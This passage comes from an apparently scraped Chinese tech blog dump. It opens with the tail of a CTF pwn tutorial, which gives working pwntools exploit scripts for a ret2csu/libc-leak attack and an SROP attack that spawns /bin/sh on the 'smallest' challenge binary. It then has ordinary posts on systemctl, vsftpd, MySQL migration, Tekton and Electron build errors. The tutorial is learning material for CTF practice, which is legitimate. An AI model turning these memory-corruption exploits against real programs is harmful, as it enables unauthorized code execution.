]    )    print(&quot;payload:&quot;, payload)    io.sendline(payload)    sleep(1)io.recvuntil(b&quot;Hello, World\\n&quot;)# 第一次让其返回write的地址，用来计算偏移csu(1, elf.got[&quot;write&quot;], 8, elf.got[&quot;write&quot;])write_addr = u64(io.recv(8))print(&quot;write:&quot;, hex(write_addr))# 这里可以使用libcsearchlibc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)offset = write_addr - libc.symbols[&quot;write&quot;]# 偏移计算好写入binsh和system地址io.recvuntil(b&quot;Hello, World\\n&quot;)csu(0, bss_addr, 16, elf.got[&quot;read&quot;])sys_addr = offset + libc.symbols[&quot;system&quot;]io.send(flat([p64(sys_addr), b&quot;/bin/sh\\0&quot;]))sleep(1)io.recvuntil(b&quot;Hello, World\\n&quot;)# 调用刚才写入的systemcsu(bss_addr + 8, 0, 0, bss_addr)io.interactive()\n\nSROP漏洞实现SROP的S是指signal机制，触发软中断信号，或者软中断的时候触发。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：\n\n内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。\n内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。对于 signal Frame 来说，会因为架构的不同而有所区别，后面会分别给出 x86 以及 x64 的 sigcontext。\nsignal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。\n\n上面这个过程是从CTFWIKI中复制的，我是没有完全的读懂，但是说白了，出现signal机制的时候会把寄存器全都压入栈中，这个机制触发之后会从栈中恢复数据到寄存器中，如果在恢复的时候把压入栈的数据给覆盖掉，那么在他触发之后恢复的时候就会直接修改寄存器的内容，这个就很厉害了，寄存器全都能控制，威力很大了。然后x86的压栈和恢复结构如下\nstruct sigcontext&#123;  unsigned short gs, __gsh;  unsigned short fs, __fsh;  unsigned short es, __esh;  unsigned short ds, __dsh;  unsigned long edi;  unsigned long esi;  unsigned long ebp;  unsigned long esp;  unsigned long ebx;  unsigned long edx;  unsigned long ecx;  unsigned long eax;  unsigned long trapno;  unsigned long err;  unsigned long eip;  unsigned short cs, __csh;  unsigned long eflags;  unsigned long esp_at_signal;  unsigned short ss, __ssh;  struct _fpstate * fpstate;  unsigned long oldmask;  unsigned long cr2;&#125;;\nx64的结构如下\nstruct _fpstate&#123;  /* FPU environment matching the 64-bit FXSAVE layout.  */  __uint16_t        cwd;  __uint16_t        swd;  __uint16_t        ftw;  __uint16_t        fop;  __uint64_t        rip;  __uint64_t        rdp;  __uint32_t        mxcsr;  __uint32_t        mxcr_mask;  struct _fpxreg    _st[8];  struct _xmmreg    _xmm[16];  __uint32_t        padding[24];&#125;;struct sigcontext&#123;  __uint64_t r8;  __uint64_t r9;  __uint64_t r10;  __uint64_t r11;  __uint64_t r12;  __uint64_t r13;  __uint64_t r14;  __uint64_t r15;  __uint64_t rdi;  __uint64_t rsi;  __uint64_t rbp;  __uint64_t rbx;  __uint64_t rdx;  __uint64_t rax;  __uint64_t rcx;  __uint64_t rsp;  __uint64_t rip;  __uint64_t eflags;  unsigned short cs;  unsigned short gs;  unsigned short fs;  unsigned short __pad0;  __uint64_t err;  __uint64_t trapno;  __uint64_t oldmask;  __uint64_t cr2;  __extension__ union    &#123;      struct _fpstate * fpstate;      __uint64_t __fpstate_word;    &#125;;  __uint64_t __reserved1 [8];&#125;;\n这俩结构不需要去刻意的去记，在pwntools有现成的对象可以直接转换。需要注意的是想要实现SROP攻击必须要具备下面几个条件\n\n可以通过栈溢出来控制栈的内容\n需要知道binsh的地址\n可以触发signal系统调用下面看一道例题。\n\n题目来源这里以 360 春秋杯中的 smallest-pwn 为例进行简单介绍。下载地址： https://github.com/bjrjk/pwn-learning/blob/main/ROP/SROP/360chunqiu2017_smallest/smallest\n文件类型(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/smallest]└─# file smallestsmallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped\n是一个64位的静态文件\n软件防护(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/smallest]└─# checksec smallest[*] &#x27;/mnt/e/CTF例题/PWN/smallest/smallest&#x27;    Arch:       amd64-64-little    RELRO:      No RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)\nNX是开启的，栈内不能执行。\nIDA分析ida中的反编译出来的内容也很简单，没有C代码只有这几行汇编，其他的啥也没有\n.text:00000000004000B0                 xor     rax, rax.text:00000000004000B3                 mov     edx, 400h       ; count.text:00000000004000B8                 mov     rsi, rsp        ; buf.text:00000000004000BB                 mov     rdi, rax        ; fd.text:00000000004000BE                 syscall                 ; LINUX - sys_read.text:00000000004000C0                 retn\n攻击思路其实就这点内容有用的内容全ida中，就只是几行汇编代码\nxor     rax, raxmov     edx, 400hmov     rsi, rspmov     rdi, raxsyscallretn\n触发系统调用的参数分别如下\nRAX = 0RDI = 0RSI = RSPRDX = 400\n相当于调用了下面的内容，0是标准输入即从屏幕输入，然后写入RSP寄存器的位置即栈顶，写入400个字符。\nsys_read(0,RSP,400)\n我们这里直接 往rsp中写入数据，并且他没有继续操控栈数据，我们就可以不需要计算的直接往RSP写入返回地址，他会直接去执行我们写入位置的代码。这类题目基本就是SROP了，后面会说一下做题可能会遇到的一些疑问。他这里往rsp中读取数据，我们直接写入3个0x4000B0,ret的时候会直接跳转到这里，然后如果正常的输出就会重复运行3次当前的程序，当ret之后的战是这样的进入第一个输入0x4000B0，也就是从头执行，这次我们要控制执行流从0x4000BB开始执行，也可以从0x4000B3开始，目的是为了跳过最开始的xor rax,rax指令，因为这个指令会清除rax，此时输入数据0xBB他就会覆盖RSP的前两位，让0x4000B0变成0x4000BB,并且这一次syscall结束之后rax会变成1，然后ret会直接到0x4000BB，rax变成1的原因是rax会存储系统调用的返回值，sys_read的返回值是输入数据的长度，第二次syscall的时候寄存器参数如下\nRAX = 1RDI = 0RSI = RSPRDX = 400\nRAX是1的时候执行write写入指令，执行的参数如下\nsys_write(0,RSP,400)\n写入屏幕RSP的值，并且是从RSP开始写400个数据，这样我们就拿到了RSP的指，我们后面写入binsh就可以根据这个地址来确定地址，此时进入到第三个0x4000B0中，这个时候我们需要通过signal机制触发一个写入系统调用，写入的位置就是基于刚才写回来的地址，需要多写一些垃圾数据，记住他的位置，如果直接写入binsh会被覆盖掉，binsh写入之后再次通过signal机制触发execve命令执行，并且写入我们刚才写入binsh的位置即可拿到sh。\n攻击脚本from pwn import *context.terminal = [&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = process(&quot;./smallest&quot;)start_addr = 0x4000B0syscall_addr = 0x4000BEpayload = p64(start_addr) * 3# gdb.attach(io)# pause()io.send(payload)# pause()# io.send(&quot;\\xbb&quot;)io.send(p8(0xBB))# pause()addr = io.recv()rsp_addr = hex(u64(addr[16:24]))print(hex(u64(addr[16:24])))# pause()# read binshsigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = u64(addr[16:24])sigframe.rdx = 0x200sigframe.rsp = u64(addr[16:24])sigframe.rip = syscall_addr# gdb.attach(io)io.send(p64(start_addr) + b&quot;a&quot; * 8 + bytes(sigframe))io.send(p64(syscall_addr) + b&quot;b&quot; * 7)print(&quot;1&quot;)# pause()payload = p64(start_addr).ljust(0x120, b&quot;b&quot;) + b&quot;/bin/sh\\x00&quot;io.send(payload)# execve(&quot;/bin/sh&quot;, 0, 0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = u64(addr[16:24]) + 0x120sigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = u64(addr[16:24])sigframe.rip = syscall_addrpayload = p64(start_addr) + b&quot;a&quot; * 8 + bytes(sigframe)# pause()io.send(payload)io.send(p64(syscall_addr) + b&quot;b&quot; * 7)io.interactive()\nBROP栈迁移其他辅助性漏洞整型溢出格式化字符串金丝雀防护绕过写在后面简单总结PWN的学习相对于其他的方向来说我认为是非常费劲，但是学会之后的利用相比于其他方向还是更容易懂的。对于pwn很多地方都需要自己去做调试(栈还好，到堆不仅得使劲去调，还得读glibc源码)，去想构造的exp每一步执行之后的栈结构，不然很难去理解他真正干了什么事，然后还是学习需要一些汇编基础，没有的话学起来会更加的费劲。还有就是这个东西还是坚持比较重要，坚持下去肯定是会有结果的。本文是我自己学习过程中的一些总结，基于博主的进度，后续的其他内容会根据博主的学习进度进行补充，有些部分理解的可能并不完全对，欢迎师傅指正。\n参考资料题目相关的全都已经加入在题目来源上了，然后下面是学习栈相关的视频\n\nCTF-WIKI: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/XMCVE 2020 CTF Pwn入门课程: https://www.bilibili.com/video/BV1854y1y7Ro国资社畜-你想有多PWN(不再更新): https://www.bilibili.com/video/BV1mr4y1Y7fWyichen小菜鸡-CTF学习系列: https://space.bilibili.com/24337218/lists/393118?type=seriesPolarCTF入门系列讲座-PWN篇: https://www.bilibili.com/video/BV1ub4y1F71R\n\n","categories":["CTF相关","PWN"],"tags":["CTF","PWN","栈溢出","栈漏洞","ROP"]},{"title":"SYSTEMCTL-系统服务管理","url":"/2022/05/03/SYSTEMCTL-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/","content":"概述systemctl是一个systemd中其中一个工具，主要用于控制systemd系统和各种服务的管理。在Linux生态系统中，Systemd被部署到了大多数的标准Linux发行版中，只有为数不多的几个发行版尚未部署。Systemd通常是所有其它守护进程的父进程，但并非总是如此。\n相关目录\n\n\n目录\n用处\n\n\n\n&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;\n每个服务最主要的启动脚本目录\n\n\n&#x2F;run&#x2F;systemd&#x2F;system&#x2F;\n系统所生成的服务脚本目录,优先级比&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;高\n\n\n&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;\n自己创建的服务启动脚本目录,优先级&#x2F;run&#x2F;systemd&#x2F;system&#x2F;高\n\n\n服务类型\n\n\n服务类型\n全称\n用处\n\n\n\nservice\n一般服务类型\n主要是系统服务，包括服务器本身所需要的本机服务以及网络服务，比较经常被使用到的服务大多是这种类型，所以，这也是最常见的类型。\n\n\nsocket\n内部程序数据交换的插槽服务\n主要是IPC（Inter-processcommunication）的传输信息插槽（socketfile）功能。这种类型的服务通常在监控信息传递的插槽档，当有通过此插槽传递信息请求链接服务的时候，就依据当时的状态将该用户的请求传送到对应的daemon，若daemon尚未启动，则启动该daemon后再传送用户的请求。使用socket类型的服务一般是比较不会被用到的服务，因此在开机时通常会稍微延迟启动的时间。一般用于本机服务比较多，例如我们的图形界面很多的软件都是通过socket来进行本机程序数据交换的行为。\n\n\ntarget\n执行环境类型\n其实是一群unit的集合，例如multi-user.target其实就是一堆服务的集合。\n\n\nmount\n文件系统挂载相关的服务\n例如来自网络的自动挂载、NFS文件系统挂载等与文件系统相关性较高的程序管理。\n\n\npath\n监测特定文件或目录类型\n某些服务需要监测某些特定的目录来提供序列服务，例如最常见的打印服务，就是通过监测打印序列目录来启动打印功能。这时就得要.path的服务类型支持。\n\n\ntimer\n循环执行的服务\n这个东西有点类似anacrontab，不过是由systemd主动提供的，比anacrontab更加有弹性\n\n\n服务管理\n\n\n目录\n使用\n\n\n\n启动服务\nsystemclt start 服务名\n\n\n关闭服务\nsystemclt stop 服务名\n\n\n重启服务\nsystemclt restart 服务名\n\n\n重载服务\nsystemclt reload 服务名\n\n\n开机自启动服务\nsystemclt enable 服务名\n\n\n开机自关闭服务\nsystemclt disable 服务名\n\n\n禁用服务\nsystemclt mask 服务名\n\n\n取消禁用\nsystemctl unmask 服务名\n\n\n服务状态\nsystemctl status 服务名\n\n\n服务状态[root@localhost ~]# systemctl status firewlald\nUnit firewlald.service could not be found.\n[root@localhost ~]# systemctl status firewalld\n● firewalld.service - firewalld - dynamic firewall daemon\n   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled)\n   Active: active (running) since Sun 2022-05-22 11:01:43 EDT; 7min ago\n     Docs: man:firewalld(1)\n Main PID: 932 (firewalld)\n    Tasks: 2 (limit: 11208)\n   Memory: 35.0M\n   CGroup: /system.slice/firewalld.service\n           └─932 /usr/libexec/platform-python -s /usr/sbin/firewalld --nofork --nopid\n\nMay 22 11:01:42 localhost.localdomain systemd[1]: Starting firewalld - dynamic firewall daemon...\nMay 22 11:01:43 localhost.localdomain systemd[1]: Started firewalld - dynamic firewall daemon.\nMay 22 11:01:43 localhost.localdomain firewalld[932]: WARNING: AllowZoneDrifting is enabled. This is considered an insecure configuration option. It &gt;\n\n已防火墙firewalld服务为例，Active：后面的就是服务当前的状态\n\n\n\n状态\n作用\n\n\n\nactive（running）\n正有一个或多个程序正在被系统执行\n\n\nactive（exited）\n仅执行一次就正常结束的服务，目前并没有任何程序在系统中执行\n\n\nactive（waiting）\n正在执行当中，不过有需要等待其他的警告才能继续处理\n\n\ninactive\n服务没有运行\n\n\ndead\n程序已清除\n\n\n在第二行的vendor preset：的后面有一个值这个值是指当前服务默认的启动方式\n\n\n\n方式\n作用\n\n\n\nenabled\n开机时自动运行\n\n\ndisabled\n开机时不运行\n\n\nstatic\n被关联的服务，不可以被自己启动，但是可以通过某些服务进行唤醒启动\n\n\nmask\n不允许被启动，被禁用了\n\n\n自定义服务概述自定义服务可以放到&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;下，后缀名按照service来创建，列如test.service。文件内容分为三个部分，如下下表\n\n\n\n类\n作用\n\n\n\n[Unit]\n定义服务的说明，信息\n\n\n[UnitType]\n上面讲了服务类型，这里就是写服务类型的，不同的unit type就得要使用相对应的设置项目,本文只将service类型\n\n\n[Install]\n关联target\n\n\nUnit\n\n\n参数\n作用\n\n\n\nDescription\n用来写服务的简易说明的\n\n\nDocumentation\n一般用来写官方文档的地址\n\n\nAfter\n声明某些服务，当那些服务开启之后自己才能启动，不是强制性的\n\n\nBefore\n声明某些服务，声明的服务开启时服务需要开启自己，也不是强制性的\n\n\nRequires\n和After一样但是这个是强制性的\n\n\nWants\n和Before一样但是这个是强制性的\n\n\nConflicts\n声明服务，进行冲突检查，当声明的服务开启则自己不能启动\n\n\nService\n\n\n参数\n作用\n\n\n\nType\n启动的方式\n\n\nEnvironmentFile\n开启服务时的环境配置变量\n\n\nExecStart\n开启服务的启动脚本\n\n\nExecStop\n关闭服务的停止脚本\n\n\nExecReload\n重置服务的重置脚本\n\n\nRestart\n当Restart&#x3D;1的时候，当服务自动关闭时它会自动再开启一个服务除非是用 systemctl强制停止服务\n\n\nRemainAfterExit\n当RemainAfterExit&#x3D;1的时候，服务停止时会自动启动\n\n\nTimeoutSec\n要改变服务状态时无法正常更改则会按照TimeoutSec设置的时间之后进入”强制结束”状态\n\n\nRestartSec\n和Restart差不多，这个可以设置时间，多久进行开启\n\n\n启动方式\n\n\n方式\n作用\n\n\n\nsimple\n默认值，使用ExecStart来启动\n\n\nforking\n理解为做为某个进程的子进程\n\n\noneshot\n与simple差不多，不过这个工作完后就结束了，不会常驻在内存中\n\n\ndbus\n与 simple 差不多，但是必须要活得一个D-Bus的值才可以运行，用这个方式启动的时候还需要设置一个BusName&#x3D;才行\n\n\nidle\n要启动的时候必须要所有的工作都顺利执行完后才会执行，一般都是开机器最后运行的东西\n\n\ninstall\n\n\n参数\n作用\n\n\n\nWantedBy\n一般都是已*.targetunit为后缀的文件,指定这个服务是在某个targetunit下，一般来说，大多的服务性质 unit 都是附挂在multi-user.target下面。\n\n\nAlso\n指出和服务一起安装或者被协助的单元。\n\n\nAlias\n进行一个链接的别名的意思，当设置开机自启的时候则服务会进行链接文件的创建，命名由Alias来指定\n\n\n","categories":["系统服务"],"tags":["开源工具","系统管理","systemd"]},{"title":"TYPECHO数据迁移","url":"/2022/06/19/TYPECHO%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB/","content":"数据库迁移起因本站用的服务器是腾讯云的轻量应用服务器，规格是2核4G8M的，前些日子开了一个游戏服务器和朋友联机，发现这个内存跑到3000左右的时候就会变的比较卡，到3500左右就会直接死机，当时就想着给服务器优化一下\n环境当时我服务器运行了typecho、harbor、gogs、Jenkins、游戏服务器、还有一些我自己写的后端程序，都在docker上运行，其中typecho、gogs的数据库都是运行单独的mysql5.7，端口不往公网暴露，然后还有一个mysql8.0对外暴露给我自己用，一共是三个，当时就寻思把gogs和typecho的迁移到8.0里面\n第一次迁移当开始迁移的时候我是直接使用DataGrip把老的数据库表拖拽到新数据表里面，修改好网站的数据地址之后基本没有任何问题，之后就没怎么在意。\n第二次迁移当我想要发布一次文章的时候出现了报错。\n\n找了好久的问题也没找到，当时就没想过是数据库的问题，重新部署了很多遍的typecho，一直是没有找到问题，一直到我打算重新部署一个数据库的时候我发现迁移之后的数据库他的主键自增索引什么的全都没有了，于是就开始第二次迁移。第二次我是使用mysqldump来进行导出，命令如下\nmysqldump --defaults-extra-file=/etc/mysql/my.cnf Blog &gt; blog.sql\n\n然后用DataGrip导入的，导入之后数据库的表结构都回来了内容也都有但是前端对接好之后又出现了问题handsome的主题不能恢复备份，emoji表情全部变成问号”?”。\n第三次迁移emoji加载不出来无非就是编码的问题，typecho之前是不支持emoji的，之前我做过数据库字符集的修改，第三次导出的时候还是用mysqldump的方式导出但是命令改成了这样，命令如下\nmysqldump --defaults-extra-file=/etc/mysql/my.cnf --default-character-set=utf8mb4  Blog &gt; blog.sql\n\nmysqldump默认导出的字符集为utf8，emoji的字符集需要utf8mb4，使用DataGrip导入之后就没问题了，emoji显示了，handsome主题备份也能恢复了。\n","categories":["问题解决"],"tags":["typecho","mysql","数据备份","数据迁移"]},{"title":"VSFTPD-FTP服务器","url":"/2022/08/05/VSFTPD-FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"VSFTPDvsftpd 是一款UNIX&#x2F;LINUX上的FTP服务器软件,号称是”可能是类UNIX系统中最安全、最快的FTP服务器”，其具有安全、快速、稳定、开源 (基于 GPLv2 协议开源)的特点。官网:https://security.appspot.com/vsftpd.html\n安装方式yum -y install vsftpd\n\n\n\n相关文件配置文件:&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf服务脚本:&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service,&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;vsftpd用户认证配置文件:&#x2F;etc&#x2F;pam.d&#x2F;vsftpd\n两种模式FTP采用双通道协议,命令连接和数据连接,并且还有两种连接模式，如下\n\n\n\n连接模式\n命令连接\n数据连接\n\n\n\n主动(PORT)\n客户端随机端口—-&gt;服务器tcp21\n客户端随机端口&lt;—-服务器tcp20\n\n\n被动(PORT)\n客户端随机端口—-&gt;服务器tcp21\n客户端随机端口—-&gt;服务器随机端口\n\n\n端口配置\n\n\n配置项\n值\n作用\n\n\n\nlisten_port\n端口号(默认21)\n命令端口号修改\n\n\nftp_data_port\n端口号(默认为20)\n主动模式端口号修改\n\n\npasv_min_port\n端口号(0为随机分配)\n被动模式端口号最小值\n\n\npasv_max_port\n端口号(0为随机分配)\n被动模式端口号最大值\n\n\n匿名配置\n\n\n配置项\n值\n作用\n\n\n\nanonymous_enable\nYES&#x2F;NO(默认NO)\n是否支持匿名用户\n\n\nno_anon_password\nYES&#x2F;NO(默认NO)\n匿名用户略过口令检查\n\n\nanon_world_readable_only\nYES&#x2F;NO(默认YES)\n匿名是否只能下载全部权限为读的文件\n\n\nanon_upload_enable\nYES&#x2F;NO(默认NO)\n匿名上传，注意:文件系统权限\n\n\nanon_mkdir_write_enable\nYES&#x2F;NO(默认NO)\n匿名是否可以创建目录\n\n\nanon_umask\n000-777\n匿名上传文件的umask\n\n\nanon_other_write_enable\nYES(默认NO)\n匿名用户是否可修改修改和上传文件\n\n\n用户配置\n\n\n配置项\n值\n作用\n\n\n\nguest_enable\nYES&#x2F;NO(默认NO)\n所有系统用户是否都映射guest用户\n\n\nguest_username\n系统用户名\n配合guest_enable生效，指定guest用户\n\n\nlocal_enable\nYES&#x2F;NO(默认YES)\n是否允许linux用户登录\n\n\nwrite_enable\nYES&#x2F;NO(默认YES)\n允许系统用户上传文件\n\n\nlocal_umask\n000-777\n指定系统用户上传文件的umask\n\n\nlocal_root\n系统目录\nguest用户登录所在目录\n\n\nchroot_local_user\nYES&#x2F;NO(默认NO)\n禁锢系统用户只能在自己的家目录活动\n\n\nchroot_list_enable\nYES&#x2F;NO\n禁锢或不禁锢特定的系统用户在家目录中\n\n\nchroot_list_file\n系统文件目录\n配合chroot_list_enable,chroot_list_enable&#x3D;YES则chroot_list_file文件中的用户不被禁锢否则相反\n\n\n日志配置\n\n\n配置项\n值\n作用\n\n\n\nxferlog_enable\nYES&#x2F;NO(默认YES)\n启用记录上传下载日志\n\n\nxferlog_std_format\nYES&#x2F;NO(默认YES)\n使用wu-ftp日志格式\n\n\nxferlog_file\n系统文件目录(默认 &#x2F;var&#x2F;log&#x2F;xferlog)\n指定wu-ftp日志文件,可自动生成\n\n\ndual_log_enable\nYES&#x2F;NO(默认NO)\n使用vsftpd日志格式\n\n\nvsftpd_log_file\n系统文件目录(默认&#x2F;var&#x2F;log&#x2F;vsftpd.log)\n指定vsftpd日志文件,可自动生成\n\n\n登录控制\n\n\n配置项\n值\n作用\n\n\n\nuserlist_enable\nYES&#x2F;NO(默认YES)\n是否启用控制用户登录的列表文件\n\n\nuserlist_deny\nYES&#x2F;NO(默认YES)\n黑名单,不提示口令,NO为白名单\n\n\nuserlist_file\n文件目录(默认 &#x2F;etc&#x2F;vsftpd&#x2F;users_list)\n用户列表文件\n\n\n网络限制\n\n\n配置项\n值\n作用\n\n\n\nmax_clients\nNULL\n最大并发连接数\n\n\nmax_per_ip\nNULL\n每个IP同时发起的最大连接数\n\n\nanon_max_rate\nNULL\n匿名用户的最大传输速率\n\n\nlocal_max_rate\nNULL\n本地用户的最大传输速率\n\n\nconnect_timeout\nNULL\n主动模式数据连接超时时长\n\n\naccept_timeout\nNULL\n被动模式数据连接超时时长\n\n\ndata_connection_timeout\nNULL\n数据连接无数据输超时时长\n\n\nidle_session_timeout\nNULL\n无命令操作超时时长\n\n\nascii_upload_enable\nYES&#x2F;NO(默认YES)\n上传时优先以文本方式传输\n\n\nascii_download_enable\nYES&#x2F;NO(默认YES)\n下载时优先以文本方式传输\n\n\nSSL配置\n\n\n配置项\n值\n作用\n\n\n\nssl_enable\nYES&#x2F;NO(默认NO)\n是否启用SSL\n\n\nallow_anon_ssl\nYES&#x2F;NO(默认NO)\n匿名是否启用SSL\n\n\nforce_local_logins_ssl\nYES&#x2F;NO(默认NO)\n本地用户登录是否加密\n\n\nforce_local_data_ssl\nYES&#x2F;NO(默认NO)\n本地用户数据传输是否加密\n\n\nrsa_cert_file\n文件位置\n证书文件位置\n\n\nPS:在配置之前请查看是否支持 SSL,使用命令”ldd`which vsftpd`“返回libssl.so即可\n其他配置\n\n\n配置项\n值\n作用\n\n\n\nuse_localtime\nYES&#x2F;NO(默认NO)\n使用当地时间（默认为NO，使用GMT）\n\n\nftpd_banner\n“欢迎信息”\n登录提示信息\n\n\nbanner_file\n文件目录(默认:&#x2F;etc&#x2F;vsftpd&#x2F;ftpbanner.txt)\n指定一个文件作为登录提示信息,ftpd_banner优先生效\n\n\ndirmessage_enable\nYES&#x2F;NO(默认YES)\n目录访问提示信息\n\n\nmessage_file\n文件名称(默认.message)\n目录的提示信息文件,默认是目录下的”.message”文件\n\n\npam_service_name\n文件名称(默认vsftpd)\n使用pam(Pluggable Authentication Modules)完成用户认证,默认对应”&#x2F;etc&#x2F;pam.d&#x2F;vsftpd”文件\n\n\nnopriv_user\n系统用户\nvsftpd服务指定用户身份运行\n\n\n","categories":["网络服务"],"tags":["网络服务","vsftpd","ftp"]},{"title":"Tekton报错:more than one PersistentVolumeClaim is bound","url":"/2024/04/24/Tekton-%E6%8A%A5%E9%94%99_%20more%20than%20one%20PersistentVolumeClaim%20is%20bound/","content":"复现task-nodejs.yaml\napiVersion: tekton.dev/v1beta1kind: Taskmetadata:  name: build-node-projectspec:  workspaces:    - name: cache      mountPath: /root/.npm    - name: source    - name: output  params:    - name: imgTag      type: string    - name: run      type: string    - name: dir      type: string  steps:    - name: build      workingDir: &quot;$(workspaces.source.path)/$(params.dir)&quot;      image: &quot;node:$(params.imgTag)&quot;      script: |        rm -rf package-lock.json        npm install --registry=https://registry.npmmirror.com/        npm run $(params.run)        cp -r dist/* $(workspaces.output.path)/\ntaskrun.yaml\napiVersion: tekton.dev/v1kind: TaskRunmetadata:  generateName: build-node-project-run-  generation: 1  namespace: cicd-servicesspec:  params:  - name: dir    value: frontend  - name: imgTag    value: 21.6.2  - name: run    value: build  serviceAccountName: default  taskRef:    kind: Task    name: build-node-project  workspaces:  - name: cache    persistentVolumeClaim:      claimName: node-cache-pvc  - name: source    persistentVolumeClaim:      claimName: test-tekton-vue-pvc  - name: output    persistentVolumeClaim:      claimName: test-tekton-vue-output-pvc\n运行之后会出现下面报错\nTaskRunValidationFailed [User error] more than one PersistentVolumeClaim is bound\n原因报错翻译TaskRunValidationFailed[用户错误]绑定了多个PersistentVolumeClaim,很明确他允许绑定多个pvc，这个蛮离谱的，cicd的过程中用到多个存储应该是很正常的事，tekton却默认不支持绑定多个pvc。\n解决修改tekton的配置把参数disable-affinity-assistant修改为true，即可\nkubectl -n tekton-pipelines edit cm feature-flags\n这个参数的作用如下\n\n设置为 true 将阻止 Tekton 为共享了 workspace 的每个 TaskRun 创建 Affinity Assistant Pod。 这样就可以保证这些 pod 运行在同一个节点上，避免了跨节点访问 pvc 的问题。\n\n还有就是这个功能在v0.60会被弃用，未来估计不会因为这个问题报这个错了。\n参考ISSUE: https://github.com/tektoncd/pipeline/issues/6543TektonDocs: https://github.com/tektoncd/pipeline/blob/main/docs/affinityassistants.md配置参考: https://www.soulchild.cn/post/tekton-operator%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/\n","categories":["问题解决"],"tags":["问题解决","Tekton","CICD"]},{"title":"Vue3+Electron构建报错","url":"/2024/02/19/Vue3+Electron%E6%9E%84%E5%BB%BA%E6%8A%A5%E9%94%99/","content":"使用环境&quot;Node&quot;:&quot;21.6.2&quot;&quot;@vue/cli-service&quot;: &quot;~5.0.0&quot;,&quot;electron&quot;: &quot;^13.0.0&quot;,\n问题一报错background.js from TerserError: error:0308010C:digital envelope routines::unsupported    at new Hash (node:internal/crypto/hash:68:19)    at Object.createHash (node:crypto:138:10)    at E:\\前端\\assist\\node_modules\\vue-cli-plugin-electron-builder\\node_modules\\webpack\\node_modules\\terser-webpack-plugin\\dist\\index.js:217:37    at Array.forEach (&lt;anonymous&gt;)    at TerserPlugin.optimizeFn (E:\\前端\\assist\\node_modules\\vue-cli-plugin-electron-builder\\node_modules\\webpack\\node_modules\\terser-webpack-plugin\\dist\\index.js:160:259)    at _next0 (eval at create (E:\\前端\\assist\\node_modules\\vue-cli-plugin-electron-builder\\node_modules\\tapable\\lib\\HookCodeFactory.js:33:10), &lt;anonymous&gt;:8:1)    at eval (eval at create (E:\\前端\\assist\\node_modules\\vue-cli-plugin-electron-builder\\node_modules\\tapable\\lib\\HookCodeFactory.js:33:10), &lt;anonymous&gt;:23:1)    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n原因用了高版本的node.js\n解决给NODE_OPTIONS添加环境变量--openssl-legacy-provider,低版本的不需要,默认忽略ssl验证\nset NODE_OPTIONS=--openssl-legacy-provider\n问题二报错Error output:!include: could not find: &quot;E:\\前端\\assist\\node_modules\\app-builder-lib\\templates\\nsis\\include\\StdUtils.nsh&quot;Error in script &quot;&lt;stdin&gt;&quot; on line 1 -- aborting creation process    at ChildProcess.&lt;anonymous&gt; (E:\\前端\\assist\\node_modules\\builder-util\\src\\util.ts:250:14)    at Object.onceWrapper (node:events:634:26)    at ChildProcess.emit (node:events:519:28)    at ChildProcess.cp.emit (E:\\前端\\assist\\node_modules\\builder-util\\node_modules\\cross-spawn\\lib\\enoent.js:34:29)    at maybeClose (node:internal/child_process:1105:16)    at Process.ChildProcess._handle.onexit (node:internal/child_process:305:5) &#123;  exitCode: 1,  alreadyLogged: false,  code: &#x27;ERR_ELECTRON_BUILDER_CANNOT_EXECUTE&#x27;&#125;\n原因路径有中文路径\n解决切换项目目录给copy到个全英路径的位置\n问题三报错打开页面全白\n原因路由模式用的history\n解决路由模式切换成hash模式\n问题四报错      \n&lt;router-view&gt;标签不生效\n原因不清楚为什么会这样 反正我这个版本打包后 electron不会进入”&#x2F;“路径下 但是在本地访问的时候会\n解决在App.vue中直接push到/\nimport &#123; useRouter &#125; from &quot;vue-router&quot;;const router = useRouter();router.push(`/`);\n要注意的是router.back();路由跳转我这边也不生效了，需要都替换成push(&#39;/&#39;)。\n问题五报错• cannot get, wait  error=Get &quot;https://service.electron.build/find-build-agent?no-cache=1it6rqj&quot;: dial tcp 51.15.76.176:443: connectex: A connection attempt failed because the connected party did not properly respond 